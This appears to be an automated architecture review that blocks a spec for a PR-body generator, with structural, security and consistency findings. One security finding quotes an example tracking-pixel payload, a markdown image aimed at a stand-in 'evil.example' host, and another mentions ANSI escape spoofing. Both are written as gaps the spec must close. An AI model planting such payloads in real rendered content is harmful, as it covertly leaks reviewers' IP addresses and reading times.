---
date: 2026-08-13
spec: .context-index/specs/features/pr-review-brief/pr-body-composition.spec.md
charter: .context-index/specs/features/pr-review-brief/charter.md
verdict: BLOCK
tier: full
last-reviewed-revision: 4
file-sha: eab4e43cb731a2d5f891d28fcb371420909a6579aa26510830abe5c99ee157b6
---

# Architecture Review: pr-body-composition

> **Date:** 2026-08-13
> **Spec:** `.context-index/specs/features/pr-review-brief/pr-body-composition.spec.md` (revision 4)
> **Charter:** `.context-index/specs/features/pr-review-brief/charter.md` (revision 4, approved)
> **Rigor tier:** `full` (risk_level `medium` → `risk-policies.yaml` `policies.medium.review_mode: full`; no `--tier` override, no routing signal)
> **Verdict:** BLOCK

## Reviewers Dispatched

| ID | Name | Mode | Profile | Prompt/Skill |
|----|------|------|---------|--------------|
| structural-architect | Structural Architect | subagent | reviewer-reasoning | `plugin:review-specs/structural-architect-prompt.md` |
| security-reviewer | Security Reviewer | subagent | reviewer-capable | `plugin:review-specs/security-reviewer-prompt.md` |
| consistency-analyzer | Consistency Analyzer | subagent | reviewer-fast | `plugin:review-specs/consistency-analyzer-prompt.md` |

Registry: domain `software` (source level `default`); `.context-index/governance/review.yaml` declares `reviewers: []`, so the three bundled defaults apply unmodified. No load warnings. No cross-repo `depends-on` references. Context pack `base` (`include: []`). Skill extensions: `__NONE__`. Module heuristics for `pr-review-brief`: 3 retrieved and injected.

---

## Structural Architect (structural-architect)

**Verdict:** BLOCK — 3 blockers, 2 warnings

### SA-1 — blocker

- **blocker_id:** `structural-architect:incorrect-consumed-contract:3dfb3f0f`
- **section_anchor:** `input-contracts`
- **Location:** § Input Contracts → Routing entries, "Consumed shape" table
- **Finding:** The spec states "the accessor returns the `{ version, entries[] }` envelope" and types every row as `entries[].*`. `readRoutingSidecar()` (`lib/plan-routing-sidecar.mjs:283-293`) returns `parseSidecarJson(body)`, which returns `doc.entries.slice().sort(...)` — a bare array (`:229-231`; JSDoc `@returns {object[]}` at `:278`). The envelope is consumed and discarded inside the module; `version` is never observable by a caller. `lookupRoutingEntry` confirms this by calling `.find()` directly on the return value (`:306`). An implementer following the table destructures a `{ version, entries }` object out of an array and gets `undefined` for both.
- **Recommendation:** Restate the consumed shape as the array the accessor actually returns and drop `version` from the *consumed-shape* table — a field the consumer cannot observe is not a consumed contract. **The version check itself is real and must be preserved:** `parseSidecarJson` validates `doc.version !== SIDECAR_SCHEMA_VERSION` and raises `INVALID_SIDECAR_JSON` (`:216-221`), which is what the Degradation paragraph and AC-13 already pin. Move the version statement wholly into Degradation; do not weaken or delete AC-13.

### SA-2 — blocker

- **blocker_id:** `structural-architect:incomplete-task-map:6231f1c4`
- **section_anchor:** `actionable-task-map`
- **Location:** § Actionable Task Map, "Output encoder" row
- **Finding:** The task reads "the **four** rules in Output Encoding Contract: path containment, table-cell safety, marker neutralization, stderr diagnostics" — that enumerates rules 2 through 5 and drops rule 1, line collapse. The contract states rule order is part of the contract and that line collapse must run first because every later rule reasons about "the start of the value." The task map is what `/adev:plan` decomposes, so the ordering-critical rule has no task carrying it even though AC-16 asserts its behavior.
- **Recommendation:** Correct the count to five and name line collapse first in the task, preserving the ordering constraint the contract declares.

### SA-3 — blocker

- **blocker_id:** `structural-architect:adr-conflict:33a8b719`
- **section_anchor:** `behaviors`
- **Location:** § Behaviors, bullet 4 ("When a referenced spec has a `<spec-stem>.routing.json` sidecar…")
- **Finding:** Behaviors keys the sidecar to the spec stem. `.context-index/adrs/0012-plan-adjacent-sidecar-artifacts.md` § "Permitted peers" defines it as `<plan-stem>.routing.json`; the charter's Consumed APIs row says the same ("keyed to the plan stem, not the spec stem, per ADR-0012"); and this spec's own § Routing entries mandates the `.spec.md`→`.plan.md` derivation through `sidecarPathFor()`. Behaviors is normative, so two normative sections of one spec now specify different path derivations. The spec itself notes the stems coincide in this repo today — the condition under which this ships unnoticed.
- **Recommendation:** Restate Behaviors bullet 4 in plan-stem terms. Additionally, no acceptance criterion pins the derivation (AC-12 asserts only that no local parser exists, AC-13 only the schema-mismatch path); adding one that exercises a spec stem differing from its plan stem is what prevents the shorthand from recurring.

### SA-4 — warning

- **Location:** § Input Contracts → Routing entries, "Degradation"; § Error Cases, `readRoutingSidecar()` row
- **Finding:** Both enumerate `INVALID_PLAN_PATH`, `INVALID_SIDECAR_JSON`, and "a read error," and describe absence in prose only. The absent case throws a distinct named code, `ROUTING_SIDECAR_MISSING` (`lib/plan-routing-sidecar.mjs:286-289`), which is the dominant path in a repo the charter says carries ~20 legacy plans with no sidecar. The contract requires annotating the section with "the thrown code," so the most frequently rendered code is the one the spec never names.
- **Recommendation:** Name `ROUTING_SIDECAR_MISSING` in both enumerations. See cross-finding note 2 — this and SEC-2 have one shared fix.

### SA-5 — warning

- **Location:** § Input Contracts → Verification, stale-revision rule
- **Finding:** The rule assumes `byRevision[N]` keys mean "validation ran against revision N." `effectiveRevision()` in `lib/lifecycle-state.mjs:1312-1325` folds any event lacking an integer `revision:` into bucket 1 (documented at `:1302-1306` as legacy-fold-as-rev-1). A spec at `revision: 1` with legacy validate events therefore renders a verdict of unknown provenance as *current* — exactly the failure the stale-revision rule exists to prevent. For specs above revision 1, the same fold over-reports staleness.
- **Recommendation:** State how a legacy-folded `byRevision[1]` bucket is distinguished from a verdict genuinely recorded against revision 1, or declare it out of contract explicitly.

**Not flagged (verified sound):** § Section ownership and marker assembly are unambiguous and agree with `pr-body-advisories.spec.md` § Section Placement. § Referenced spec frontmatter correctly declares the fourth input — `currentState()` returns a projection carrying no spec revision (verified at `lib/lifecycle-state.mjs:1277-1294`, `:1401`). The sorted-entries and stable-sort tie-break claims are accurate against `lib/plan-routing-sidecar.mjs:231`. Dependency direction and the `cli-driver-surface` boundary are respected.

---

## Security Reviewer (security-reviewer)

**Verdict:** BLOCK — 2 blockers, 1 warning, 1 suggestion

**Cited precedent verified.** The quote of `renderRoutingMarkdown` (`.replace(/\|/g, "\\|").replace(/\n+/g, " ")`) is byte-accurate against `lib/plan-routing-sidecar.mjs:343`. The precedent's `/\n+/g` would not catch a bare `\r`; the spec's rule 1 explicitly widens to `\n`, `\r`, and `\r\n`, so it does not overclaim the precedent's coverage. No defect in rule 1 as written.

### SEC-1 — blocker — input-validation

- **blocker_id:** `security-reviewer:input-validation:2d90002f`
- **section_anchor:** `output-encoding-contract`
- **Finding:** The Output Encoding Contract (rule 1 line collapse, rule 2 path containment, rule 3 table-cell `|`/`#`/`-`/`>` neutralization, rule 4 `<!--`/`-->` neutralization) never neutralizes markdown link/image syntax (`[`, `]`, `(`, `)`, `!`). `entries[].rationale` is explicitly named "Attacker-influenceable" and is rendered as free text into a table cell. A crafted rationale such as `![](https://evil.example/t?x=1)` passes all rules unchanged — no `|`, no leading block character, no comment delimiter — and GitHub renders it as a live `<img>` in the public PR body, firing an outbound request that leaks the viewing reviewer's IP and user-agent and confirms when the PR was read. This is a passive tracking-pixel exfiltration channel. The same gap applies to every free-text value the encoder touches, and to the sibling `pr-body-advisories.spec.md`, which explicitly delegates all escaping to this same encoder ("passes through the single encoder defined in `pr-body-composition.spec.md` § Output Encoding Contract").
- **Recommendation:** Neutralize markdown link/image construction at the same interpolation boundary — escape `[` and `]`, and any `!` immediately preceding `[`, or break the `](` sequence. **Insert it before table-cell safety rather than appending it as "a fifth rule"** — the contract already has five rules and rule 5 is Diagnostics; appending collides with the renumbering SA-2 requires. CWE-116.

### SEC-2 — blocker — rate-limiting (availability)

- **blocker_id:** `security-reviewer:rate-limiting:70d813a6`
- **section_anchor:** `input-contracts`
- **Finding:** `readRoutingSidecar()` can throw `INVALID_ROUTING_ENTRY`, not only the codes the spec enumerates: `parseSidecarJson` calls `validateEntry` on every entry at **read** time (`lib/plan-routing-sidecar.mjs:228`), so `rationale.length > MAX_RATIONALE_LEN` (400), a non-string `rationale`, a missing `scores` dimension, or an out-of-range score each throw `INVALID_ROUTING_ENTRY`. The spec's Degradation clause and the Error Cases table enumerate only `INVALID_PLAN_PATH`, `INVALID_SIDECAR_JSON`, and "a read error." An implementer following the literal enumeration writes a code-by-code catch and the throw escapes, contradicting the Behavioral Contract ("never blocks… degrade to explicit gaps… rather than to a non-zero exit") and the postcondition "Exit code is 0 whenever `HEAD` and the base ref resolve." Because `rationale` is attacker-influenceable and the cap is enforced on read, a committed sidecar with an oversized entry crashes the generator in CI.
- **Recommendation:** Widen the degradation clause to **"any throw from `readRoutingSidecar()`"** — a catch-all around the call site, not a code-by-code switch — and say the annotation renders whatever `err.code` was thrown. This single change also resolves SA-4 and stops rev 5 from enumerating codes a third time and missing a fourth. CWE-1284 / availability.

### SEC-3 — warning — input-validation

- **Finding:** Rule 3 neutralizes `|` and leading block characters, but no rule strips other C0 control characters (`\x1b` ANSI escape, `\x07`, `\v`, `\f`). GitHub's web renderer is unaffected, but `adev pr body` output is also consumed by `cicd` and plausibly piped to a terminal (`gh pr view`, local diffing) by a human reviewer, where an attacker-controlled rationale carrying ANSI escapes can hide or spoof text.
- **Recommendation:** Extend rule 1 (or add a rule 1b) to replace all C0 control characters other than the already-handled `\n`/`\r` at the same interpolation boundary.

### SEC-4 — suggestion — rate-limiting

- **Finding:** No input-size bound is specified for the commit range itself — commit count, distinct-task count, or per-task file-set size (`git diff-tree --name-only` output is unbounded). A very large PR could produce unbounded time and an unbounded generated body, unlike the sibling spec's explicit per-value cap.
- **Recommendation:** State an explicit ceiling (e.g. cap rendered rows per section with a `+N more` line), or record the CI job's own timeout as the accepted mitigation so the gap is a documented tradeoff.

**Not flagged:** no authentication or authorization findings — this is a local read-only CLI verb whose postconditions forbid network and forge calls, so auth is correctly out of scope. No secrets-handling findings; the spec references no credentials.

---

## Consistency Analyzer (consistency-analyzer)

**Verdict:** BLOCK — 1 blocker, 1 warning, 1 suggestion

### CON-1 — blocker — contract

- **blocker_id:** `consistency-analyzer:contract:1a299478`
- **section_anchor:** `behaviors`
- **This Spec:** § Input Contracts → Routing entries: "ADR-0012 § 'Permitted peers' defines the sidecar as `<plan-stem>.routing.json`. This spec starts from a `Spec:` trailer, so the derivation is explicit: `<spec-path>` with the `.spec.md` suffix replaced by `.plan.md`, passed to `sidecarPathFor()`."
- **Conflicts With:** § Behaviors, bullet 4: "**When** a referenced spec has a `<spec-stem>.routing.json` sidecar **then** its entries populate the attention map…" — and `.context-index/adrs/0012-plan-adjacent-sidecar-artifacts.md` § "Permitted peers", and `charter.md` § Interface Contracts → Consumed APIs.
- **Failure scenario:** an implementation following Behaviors derives the sidecar from the spec stem; wherever a spec stem and its plan stem differ, no routing entry is ever found and every task renders `UNKNOWN` despite a valid sidecar existing on disk.
- **Recommendation:** Change Behaviors bullet 4 to `<plan-stem>.routing.json`. **Same underlying defect as SA-3** — one edit closes both.

### CON-2 — warning — contract

- **This Spec:** § Behaviors: "**When** any interpolated value contains `|`, a leading block character, `<!--`, `-->`, or **shell metacharacters** **then** it is encoded per the Output Encoding Contract…"
- **Conflicts With:** § Output Encoding Contract, rules 1–5, none of which define shell-metacharacter handling (`$`, backtick, `\`, `;`).
- **Recommendation:** Prefer removing "shell metacharacters" from the Behaviors condition — the real constraint is the Task Map's "consuming values as data (never interpolated into a shell or `node -e` context)", which is a *non-interpolation* rule, not an *encoding* rule. Alternatively add an explicit rule. Leaving the term in the Behaviors condition with no matching rule invites an implementer to invent one.

### CON-3 — suggestion — terminology

- **This Spec:** § Input Contracts declares `entries[].scores.novelty` as a consumed field, but no ranking, rendering, or acceptance criterion uses it (Task Map "Attention map ranking", Behaviors bullet 4, and AC-5 all sort on `selected_agent` then `scores.blast_radius` only).
- **Conflicts With:** `charter.md` § Domain Model lists `novelty` as a key attribute of Attention Entry.
- **Recommendation:** Either state how `novelty` is rendered or used as a secondary key, or drop it from Input Contracts so the consumed set matches what is actually consumed.

**Verified consistent:** the § Section ownership table matches `pr-body-advisories.spec.md` § Section Placement exactly on slot list, order, and owners. The file naming complies with `.context-index/specs/cross-cutting/spec-file-suffixes.spec.md`.

---

## Cross-finding notes

These govern how revision 5 should be written; they are not additional findings.

1. **SA-3 and CON-1 are the same defect** — § Behaviors bullet 4's `<spec-stem>.routing.json`. Two reviewers found it independently, so it carries two distinct `blocker_id`s and appears as two entries in the `.blockers.md` sidecar. Patch that line once; both clear together.
2. **SA-4 (warning) and SEC-2 (blocker) share one fix** — widen the `readRoutingSidecar()` degradation clause to "any throw," rather than enumerating codes a third time. Enumeration has now missed `ROUTING_SIDECAR_MISSING` and `INVALID_ROUTING_ENTRY` across two revisions.
3. **SEC-1's fix must not append a rule.** The contract has five rules and rule 5 is Diagnostics; the markdown-link rule belongs before table-cell safety. SA-2's renumbering fix and SEC-1's insertion must be applied together or they contradict each other.
4. **SA-1 must not weaken AC-13.** The `version` check is real inside `parseSidecarJson`; only the claim that a *caller* observes it is wrong.

## Revision-3 blocker disposition

All three revision-3 blockers are **addressed**; none recurs. Independently confirmed against source rather than assumed:

| Revision-3 blocker | Status | Evidence |
|---|---|---|
| `structural-architect:module-boundary-violation:8f8edfe8` | addressed | § Routing entries now mandates `lib/plan-routing-sidecar.mjs`; AC-12 forbids a local parser. The accessor's exports, `INVALID_PLAN_PATH` guard, and `task_id`-ascending sort were verified against source. |
| `structural-architect:undeclared-input:73288079` | addressed | § Referenced spec frontmatter declares the fourth input; `currentState()` verified to expose no spec revision (`lib/lifecycle-state.mjs:1277-1294`). |
| `security-reviewer:input-validation:7f5c8554` | addressed | Rule 1 line collapse added and ordered first; the cited `renderRoutingMarkdown` precedent verified byte-accurate. |

Every blocker in this round is **new**. Three of the six (SA-1, SA-2, SA-3/CON-1) are direct artifacts of the hand-edit that produced revision 4 — a consumed-shape table written from the module's file-format docblock rather than its return value, a rule count not propagated into the Task Map, and a path convention corrected in one section but not the other. The remaining two (SEC-1, SEC-2) are pre-existing gaps this round reached for the first time.

---

## Summary

**Total findings:** 11 (6 blockers, 4 warnings, 2 suggestions — SA-3 and CON-1 are one underlying defect)

| Reviewer | Verdict | Blockers | Warnings | Suggestions |
|---|---|---|---|---|
| structural-architect | BLOCK | 3 | 2 | 0 |
| security-reviewer | BLOCK | 2 | 1 | 1 |
| consistency-analyzer | BLOCK | 1 | 1 | 1 |

**Action required:** Revise the spec to revision 5 addressing the six blockers, then re-review. Blocker entries with canonical `blocker_id` and `section_anchor` are in `pr-body-composition.blockers.md`. Five distinct edits close all six: (1) correct the consumed-shape table in § Routing entries without weakening AC-13; (2) fix the rule count and name line collapse in the Task Map "Output encoder" row; (3) change § Behaviors bullet 4 to `<plan-stem>.routing.json` and add an acceptance criterion pinning the derivation; (4) insert markdown-link/image neutralization before table-cell safety; (5) widen the `readRoutingSidecar()` degradation clause to any throw.

**Governance:** `.context-index/governance/gates.yaml` declares no `approver_role` on a `spec-to-plan` transition, so no additional approver is required beyond this gate.
